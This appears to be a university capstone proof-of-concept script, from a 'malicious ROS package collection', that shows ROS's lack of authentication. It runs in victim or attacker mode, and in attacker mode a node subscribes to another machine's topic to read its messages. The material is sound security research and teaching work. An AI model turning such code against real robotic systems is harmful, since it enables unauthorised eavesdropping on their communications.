#!/usr/bin/env python
###################################################################################
##                _____________
##               /           ,.\
##              /           /  \\
##        o    /           {    }\
##         `.  \ ....       \  / /
##           `. \ \\\\       `' /
##             \ \_____________/
##              \      \ \
##               \      \ \
##                \     _\ \________________________
##                (`\  /  \ \ ___         "-._       )
##                 \ \/   /`-'  /,       /`-._"-._  /
##                  `/    """"""'       /___ _"-._"-._
##                  /___ __  _          `-._      '  /
##                  \  RoboSec              "-._ /  /
##                 __\________________________  "  /
##               /    '//,  '//'               )__/
##              /       '///'    ,//'/,       /
##             (.---------------------------./
##              `:.                        //
##                `=======================''
##                  Security for Robotics
##
##             Oregon State University - CS Capstone
##
##         Zach Rogers - Malicious ROS Package Collection
##
##             ROS Package 2 - Broken Authentication
##                         ros2.py
###################################################################################
import os
import rospy
from std_msgs.msg import String

#ROS Environment Variables -- Will need to change these accordingly
ROS_CORE_PORT = "1337"
VICTIM_ROS_HOSTNAME = "http://192.168.0.10"
VICTIM_ROS_MASTER_URI = VICTIM_ROS_HOSTNAME + ":" + ROS_CORE_PORT

ATTACKER_ROS_MASTER_URI = VICTIM_ROS_MASTER_URI
ATTACKER_ROS_HOSTNAME = "http://192.168.0.11"

#IS THIS SCRIPT RUNNING ON THE ATTACKER OR VICTIM MACHINE?
#When set to VICTIM, the PoC will establish the victim publisher
#When set to ATTACKER, the PoC will setup the attacker subscriber
#Use sys args instead?
WHOAMI = "VICTIM"

#Should we be loud and proud?
VERBOSE = True

def attacker_callback(data):
    """
    ROS Subscriber Callback

    http://wiki.ros.org/ROS/Tutorials/WritingPublisherSubscriber%28python%29
    """

    rospy.loginfo(rospy.get_caller_id() + 'I heard %s', data.data)

def attacker():
    """
    ROS Subscriber, to be ran on the attackers's machine

    http://wiki.ros.org/ROS/Tutorials/WritingPublisherSubscriber%28python%29
    """

    #Set env variables
    log("[!] We are the attacker, setting ROS env variables...")
    os.system("export ROS_MASTER_URI=" + VICTIM_ROS_MASTER_URI)
    os.system("export ROS_HOSTNAME=" + VICTIM_ROS_HOSTNAME)

    #Get ROS core running on the proper port
    os.system("roscore -p " + ROS_CORE_PORT)

    #Get the Subscriber (or listener) setup
    rospy.init_node('listener', anonymous=True)
    rospy.Subscriber('poc_auth', String, attacker_callback)

    #Keep python from exiting until this node is stopped
    rospy.spin()

def victim():
    """
    ROS Publisher, to be ran on the victim's machine

    http://wiki.ros.org/ROS/Tutorials/WritingPublisherSubscriber%28python%29

    """

    #Set env variables
    log("[!] We are the victim, setting ROS env variables...")
    os.system("export ROS_MASTER_URI=" + ATTACKER_ROS_MASTER_URI)
    os.system("export ROS_HOSTNAME=" + ATTACKER_ROS_HOSTNAME)

    #Get ROS core running on the proper port
    os.system("roscore -p " + ROS_CORE_PORT)

    #Setup the publisher (or talker)
    pub = rospy.Publisher('poc_auth', String, queue_size=10)
    rospy.init_node('talker', anonymous=True)
    rate = rospy.Rate(10) # 10hz

    #Publisher loop
    while not rospy.is_shutdown():
        hello_str = "hello, from the VICTIM machine %s" % rospy.get_time()
        rospy.loginfo(hello_str)
        pub.publish(hello_str)
        rate.sleep()

def log(text):
    """
    Logging function - Will output text if VERBOSE is set to True, otherwise calls will be ignored.

    Parameters:
    --------------
        * text - String of text to be logged

    """

    if VERBOSE:
        print str(text)


def main():
    log("[~] PoC showing lack of authentication in ROS...")

    if WHOAMI == "VICTIM":
        victim()

    elif WHOAMI == "ATTACKER":
        try:
            attacker()
        except rospy.ROSInterruptException:
            pass

if __name__ == '__main__':
    main()
